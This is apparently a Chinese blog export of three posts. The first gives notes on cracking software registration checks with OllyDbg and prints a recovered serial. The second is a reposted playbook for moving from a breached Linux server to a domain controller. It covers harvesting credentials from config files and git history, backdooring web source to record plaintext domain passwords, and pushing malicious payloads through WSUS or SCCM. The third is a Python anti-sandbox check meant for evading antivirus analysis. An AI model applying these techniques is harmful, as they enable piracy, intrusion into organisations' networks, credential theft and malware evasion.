<h1 id="追出第一个注册码"><a href="#追出第一个注册码" class="headerlink" title="追出第一个注册码"></a>追出第一个注册码</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小知识</span><br><span class="line">在od中使用搜索功能的时候，右键find nxet可以看到搜索的下一个结果</span><br><span class="line">od中提示断点损坏可以点击b然后右键激活断点</span><br><span class="line"></span><br><span class="line">左上角 : 反汇编窗口 ;</span><br><span class="line">右上角 : 寄存器窗口 ;</span><br><span class="line">左下角 : 数据窗口 ;</span><br><span class="line">右下角 : 堆栈窗口 ;</span><br></pre></td></tr></table></figure>



<p>是一个软件</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905142142695.png" alt="image-20220905142142695"></p>
<p>需要注册码，这次的目标就是这个</p>
<p>首先查壳没查到</p>
<p>然后通过搜索弹出的注册失败字符串定位到关键的跳转地方</p>
<p>设置一个断点进行一个爆破</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905152234987.png" alt="image-20220905152234987"></p>
<p>随后给他改成jne</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905152323728.png" alt="image-20220905152323728"></p>
<p>这时候就注册成功了！</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905152417992.png" alt="image-20220905152417992"></p>
<p>但是我们需要的不是这个，我们这次的目的是将文件的注册码给拖出来</p>
<p>重新运行然后断点，发现堆栈中压入了我们输入的东西和一个看着很像注册码的东西。</p>
<p>那我们就用这个试一下</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905153432443.png" alt="image-20220905153432443"></p>
<p>成功拿下！</p>
<h1 id="深入追踪注册码"><a href="#深入追踪注册码" class="headerlink" title="深入追踪注册码"></a>深入追踪注册码</h1><p>感觉还是挺有意思的，学完学滴水逆向</p>
<p>又是拿到一个程序，我还是想先爆破一下再来拖注册码。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905154409712.png" alt="image-20220905154409712"></p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905154711746.png" alt="image-20220905154711746"></p>
<p>首先还是搜索到关键跳转位置然后断点，然后改成jz。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905154843848.png" alt="image-20220905154843848"></p>
<p>注册成功喵</p>
<p>然后关键call就是关键跳转的上面的几个之中（加个断点，卡住了就是关键call），我们进入反汇编窗口，其中的内存地址也是可以进去的，按f7或者上面暂停右边的那个按钮进入。</p>
<p>可以看到栈里面压入了我们的用户名</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905155500705.png" alt="image-20220905155500705"></p>
<p>一步一步往下走就会发现，存在一个看上去就很象注册码的东西。</p>
<p>Pict-3323ureRe-138C，用它来注册</p>
<p>再次拿下</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905155805136.png" alt="image-20220905155805136"></p>
<p>但是这里提示一下，这是一个重启验证，光是爆破之后是没有效果的，我刚才只是练习一下，我们后面可以通过修改注册表之类的操作进行修改。</p>
<h1 id="制作文件的补丁"><a href="#制作文件的补丁" class="headerlink" title="制作文件的补丁"></a>制作文件的补丁</h1><p>用工具就好</p>
<p>这傻逼电脑给我吧工具删掉了</p>
<h1 id="初识按钮事件"><a href="#初识按钮事件" class="headerlink" title="初识按钮事件"></a>初识按钮事件</h1><p>这里没有给我例子，我这里就简单的记录一下，事件过去那么就了我也不知道下面总结的对不对喵，可以更多参考后续的水滴逆向笔记</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C++的按钮事件采用查找SUB EAX,0A</span><br><span class="line"></span><br><span class="line">DELPHI查找按钮事件 右键查找--查找二进制字符串740E8BD38B83????????FF93????????采用crtl+l键进行下翻页查找，需每一个都下上断。</span><br><span class="line"></span><br><span class="line">易语言按钮事件特征码：FF 55 fC 5F 5E</span><br><span class="line"></span><br><span class="line">UV8的按钮事件采用查找SUB EAX ,0A</span><br><span class="line"></span><br><span class="line">VB查找按钮事件是采用二进制字符串 816C2404??000000</span><br><span class="line">注意：在识别VB P-code编译时，只需要查找不到按钮事件就是P-CODE编译</span><br><span class="line"></span><br><span class="line">Ctrl+b 查找二进制字符串</span><br></pre></td></tr></table></figure>

<p>这个也就是方便我们在没有字符串的时候破解程序。</p>
<h1 id="暂停法的应用"><a href="#暂停法的应用" class="headerlink" title="暂停法的应用"></a>暂停法的应用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.出现提示</span><br><span class="line"></span><br><span class="line">2.点击暂停</span><br><span class="line"></span><br><span class="line">3.显示关键调用</span><br><span class="line"></span><br><span class="line">4.修改破解</span><br></pre></td></tr></table></figure>

<p>还是拿到一个程序，但是没有搜索到关键字，这时候我们就可以使用暂停法。</p>
<p>例如这个</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905184429925.png" alt="image-20220905184429925"></p>
<p>就是在弹窗的时候点击暂停</p>
<p>然后按上面k键，也就是调应用堆栈的意思。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905184613338.png" alt="image-20220905184613338"></p>
<p>这时候就可以看到应用堆栈里面存在</p>
<p>找到其中的一个messageboxa，右键，显示调用</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905184905616.png" alt="image-20220905184905616"></p>
<p>就成功来到了弹窗的地方。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905185019983.png" alt="image-20220905185019983"></p>
<p>在下面找到调用的地方，爆破即可。</p>
<h1 id="易语言花指令的去除"><a href="#易语言花指令的去除" class="headerlink" title="易语言花指令的去除"></a>易语言花指令的去除</h1><p>首先拿到的是一个有易语言花指令的东西。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905205155751.png" alt="image-20220905205155751"></p>
<p>我们选择插件，选择junk code插件，下面填一万</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905205322659.png" alt="image-20220905205322659"></p>
<p>这个时候就已经去除花指令了，直接用插件解决！</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905205348441.png" alt="image-20220905205348441"></p>
<p>最后就找到关键字符串爆破即可。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905211034083.png" alt="image-20220905211034083"></p>
<h1 id="易语言非独立编译查找字符串"><a href="#易语言非独立编译查找字符串" class="headerlink" title="易语言非独立编译查找字符串"></a>易语言非独立编译查找字符串</h1><p>首先判断加壳没有</p>
<p>如果查壳显示是c++6.0  但是查找字符串是这个样子的，特别是最后一个，那么基本就可以肯定是易语言加的伪装壳。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905212153326.png" alt="image-20220905212153326"></p>
<p>1.方法：<br>搜索字符串<br>在error字符串那里，有一个机器码，FFD0这个就是易语言永远不变的机器码。<br>找到之后断点，f7进入他，随后f8到下面这地方的时候，继续f7进入，为什么呢，因为执行到这个call的时候就弹窗说密钥不对了。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905215418436.png" alt="image-20220905215418436"></p>
<p>进入之后找到cld汇编指令，右键他查找字符串。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905215831449.png" alt="image-20220905215831449"></p>
<p>可以看到已经查到了。这吾爱破解也不讲原理啊。麻了。</p>
<p>这tm对面的服务器挂了，软件也没了。额。。。</p>
<p>这里就是用第一个方法吧。</p>
<p>但是不建议大伙学这个课程，直接讲如何操作，一点原理都不讲，不利于日后发展，所以笔者在这节课就没看了，改为学习比较正规的某水逆向课程。</p>
]]></content>
      <categories>
        <category>-nixiang</category>
      </categories>
  </entry>
  <entry>
    <title>通过linux服务器进入内网后如何快速达到域控的思路总结</title>
    <url>/2023/02/19/%E9%80%9A%E8%BF%87linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91%E5%90%8E%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BE%BE%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="通过linux服务器进入内网后如何快速达到域控的思路总结"><a href="#通过linux服务器进入内网后如何快速达到域控的思路总结" class="headerlink" title="通过linux服务器进入内网后如何快速达到域控的思路总结"></a><strong>通过linux服务器进入内网后如何快速达到域控的思路总结</strong></h1><p>此文章为转发，方便日后查阅。</p>
<p><a href="https://www.bilibili.com/read/cv20125695">通过linux服务器进入内网后如何快速达到域控的思路总结 - 哔哩哔哩 (bilibili.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linux服务器的resolve.conf 中dns可能会设置为域控</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查/etc/krb5.conf  </span><br><span class="line"></span><br><span class="line">Azure 中的vm可以通过配置kerberos将vm加入托管域，使Azure AD域账户通过ssh登录linux服务器</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查smb.conf / 查mnt cifs挂载</span><br><span class="line"></span><br><span class="line">linux 主机连接windows 445 smb共享文件夹有两种方式，一种是通过samba-client客户端，一种是通过mount cifs去挂载共享文件夹的cifs文件系统，可以查看samba-client 的配置文件，或者查看.bash_history查看连接历史，这里连接的大概率不是域控主机，但可能是域内的nas或域内的服务器，小概率会是开发的测试机，不管怎么样，都离我们的目标更近了一步，而且nas里面有敏感信息正常吗，很正常啊</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找ad登录验证的web服务器</span><br><span class="line"></span><br><span class="line">在大型组织的内网，很可能存在通过域进行身份验证的服务器，包括但不限于通过ad账号验证的erp、crm系统、邮箱系统或域账号管控系统，通过web端口扫描找到对应的服务器并尝试对web系统、数据库弱口令等各种姿势去getshell，在进入内网后的众多web系统中可以提高对他的渗透优先级</span><br><span class="line"></span><br><span class="line">拿到后可以在web源码或配置文件中找到ad服务器的ip端口等信息，如果数据库保存了账号密码明文很好，但大概率是加密后的账号密码，可以改源码加个后门把域账号密码明文保存下来</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找ad账号验证的vdi管控或登录系统（Crtrix ADC、Vcenter、国内某些厂商的VDI管控平台等等）</span><br><span class="line"></span><br><span class="line">这里的vdi系统其实也是套web系统，但因为这些网络设备如果是登录系统拿到shell权限后大概率会跨网段进入域控和vdi主机所在的网段，如果是管控系统的话，如果都是vdi主机组的域，那基本就结束了，所以单独拿出来说一下。拿到对应的服务器权限后一般都会有一个本地与域控服务器通信的域控账号将设备注册到域控中，密码不出意外都是加密的，这里吹一波msf，在cs烂大街的情况下，还是有一堆痴心不改的老外愿意把这些关键设备的配置文件解密脚本更新到msf的插件中</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找WSUS服务器/EDR终端管控服务器/SCCM服务器</span><br><span class="line"></span><br><span class="line">WSUS就是windows推送更新补丁包的服务器，拿到之后可以给域控分发补丁（exe或恶意命令）然后打域控，当然不是扫135看到WSUS就一定有域，这玩意也能放到工作组里用</span><br><span class="line"></span><br><span class="line">SCCM是 Microsoft 的一种解决方案，可在整个组织中以可扩展的方式增强管理。SCCM 允许大量功能，包括将 PowerShell 脚本推送到其客户端、将命令推送到其客户端、在客户端上打开远程终端会话、在其客户端上安装软件、更改其客户端上的策略等等。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano/cat /var/log/secure</span><br><span class="line"></span><br><span class="line">emm...如果拿到内网web系统，查下端口访问，可能能看到办公机访问的ip或办公网网关ip，对所在网段389或636,3268,3269（GC服务）端口扫描可能会有收获</span><br><span class="line"></span><br><span class="line">查看ssh连接历史的ip也是一个意思，快速定位可达windows主机的IP段，尽量少在内网大的网段扫描探测</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">135端口扫描</span><br><span class="line"></span><br><span class="line">OXID find是yyds啦</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openvpn配置文件</span><br><span class="line"></span><br><span class="line">适用的环境比较奇怪，现在的云主机比较多嘛，有时候源码在内网的gitlab上，或者有些其他需要与内网资源交互的奇特场景，会给服务器上配个vpn，拿到账号密码ip端口就去连内网去搞内网渗透去了，像vpn账号嘛、邮箱账号嘛、sso账号嘛和域控账号密码一毛一样很正常嘛，如果能在主机上能翻到ADFS sso账号简直中奖好嘛，这一块主要看操作的人在主机上留了什么东西了</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gitlab信息收集</span><br><span class="line"></span><br><span class="line">就像前面说的内网存在一些需要ad验证的web系统，如果拿到gitlab之类的源码平台搜索关键字ldap在源码中、注释中可能会找到测试的ad账号和服务器地址，如果最新的版本中找不到，记得在老的commit中翻一下，git系统的位置可以在拿到权限的服务器源码的.git的config之类的配置文件中找</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>通过检测是否存在q盾反沙箱</title>
    <url>/2022/11/12/%E9%80%9A%E8%BF%87%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8q%E7%9B%BE%E5%8F%8D%E6%B2%99%E7%AE%B1/</url>
    <content><![CDATA[<h1 id="通过检测是否存在q盾反沙箱"><a href="#通过检测是否存在q盾反沙箱" class="headerlink" title="通过检测是否存在q盾反沙箱"></a>通过检测是否存在q盾反沙箱</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen,system</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_sandbox</span>():</span></span><br><span class="line">    system(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">process_list = popen(<span class="string">&quot;cmd /c tasklist&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> process_list.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;QQProtect.exe&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">        not_sandbox()</span><br><span class="line">        exit(<span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;msg * 是沙箱&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/12/%E9%80%9A%E8%BF%87%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8q%E7%9B%BE%E5%8F%8D%E6%B2%99%E7%AE%B1/image-20221112145727789.png" alt="image-20221112145727789">****</p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
</search>
